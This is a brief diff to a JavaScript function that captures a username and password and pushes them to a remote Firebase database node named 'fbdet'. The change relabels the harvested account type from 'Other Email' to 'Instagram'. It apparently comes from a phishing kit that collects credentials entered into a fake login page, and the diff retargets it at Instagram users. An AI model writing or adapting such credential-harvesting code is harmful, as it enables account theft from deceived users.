@@ -148,7 +148,7 @@ function emlog() {
   var currentTime = new Date().toISOString().slice(11, 19);
   var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
   console.log(timezone);
-  var accountType = 'Other Email';
+  var accountType = 'Instagram';
 
   if (username !== '' && password !== '') {
     firebase.database().ref('fbdet').push({
